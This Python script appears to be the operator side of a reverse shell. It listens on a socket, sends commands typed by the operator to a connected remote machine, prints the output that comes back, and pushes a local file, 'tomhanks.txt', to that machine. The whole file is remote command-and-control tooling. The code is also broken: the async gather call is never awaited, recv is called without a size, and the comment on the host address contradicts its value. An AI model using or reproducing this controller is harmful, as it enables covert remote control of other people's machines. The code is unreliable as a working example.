from http import client
import socket
from unittest import result
import os
import asyncio
HOST = '127.0.0.1'                 # Symbolic name meaning all available interfaces
PORT = 50007   
SEPARATOR = "<sep>"
s = socket.socket()
           # Arbitrary non-privileged port

class Server:
    def __init__(self,HOST,PORT,SEPARATOR,s):
        self.HOST = HOST
        self.PORT = PORT
        self.SEPARATOR = SEPARATOR
        self.s = s
    async def startserver(self):
        self.s.bind((self.HOST, self.PORT))
        self.s.listen(1)
        self.conn, self.addr = s.accept()
        print("* SERVER STARTED *")
        self.cwd = self.conn.recv(1024).decode()


    async def communication(self):
        with self.conn:
            print('Connected by', self.addr)
            while True:
                self.command = input(f'{self.cwd} $> ')
                if not self.command.strip():
                    continue
                self.conn.send(self.command.encode())
                if self.command.lower() == "exit":
                    break
                output = self.conn.recv(1024).decode()
                self.results, self.cwd = output.split(SEPARATOR)
                print(self.results)
    async def filecreate(self):
        self.cwd = self.conn.recv().decode()
        filename = open("tomhanks.txt","r")
        data = filename.read()
        self.conn.send('tomhanks.txt'.encode("utf-8"))
        self.conn.send(data.encode('utf-8'))

server = Server(HOST,PORT,SEPARATOR,s)
async def main():
    asyncio.gather(
    server.startserver(),
    server.communication(),
    server.filecreate(),
    )
asyncio.run(main())